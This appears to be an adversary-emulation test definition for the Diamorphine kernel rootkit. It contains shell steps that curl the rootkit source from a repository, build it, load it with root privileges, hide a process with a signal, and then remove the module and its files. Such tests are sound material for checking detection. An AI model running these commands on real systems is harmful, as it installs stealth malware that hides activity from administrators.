name: Loadable Kernel Module based Rootkit (Diamorphine)
description: Loads Diamorphine kernel module, which hides itself and a processes.

data.command:
sudo modprobe #{rootkit_name}
ping -c 10 localhost >/dev/null & TARGETPID="$!"
ps $TARGETPID
kill -31 $TARGETPID
ps $TARGETPID || echo "process ${TARGETPID} hidden"

kill -63 1
sudo modprobe -r #{rootkit_name}
sudo rm -rf /lib/modules/$(uname -r)/#{rootkit_name}.ko /tmp/atomic
sudo depmod -a

steps.name: Check dependency 1/1
steps.description: The kernel module must exist on disk at specified location (#{rootkit_name}.ko)

data.command: if [ -f /lib/modules/$(uname -r)/#{rootkit_name}.ko ]; then exit 0; else exit 1; fi;

steps.name: Resolve dependency 1/1
steps.description: The kernel module must exist on disk at specified location (#{rootkit_name}.ko)

data.command:
mkdir -p /tmp/atomic && cd /tmp/atomic
curl -sLO #{repo}/archive/#{rev}.zip && unzip #{rev}.zip && cd Diamorphine-#{rev}
make
sudo cp #{rootkit_name}.ko /lib/modules/$(uname -r)/
sudo depmod -a

steps.name: Re-check dependency 1/1
steps.description: The kernel module must exist on disk at specified location (#{rootkit_name}.ko)

data.command: if [ -f /lib/modules/$(uname -r)/#{rootkit_name}.ko ]; then exit 0; else exit 1; fi;

input_arguments.name: repo
input_arguments.description: Url of the diamorphine github repo

input_arguments.name: rev
input_arguments.description: Revision of the github repo zip
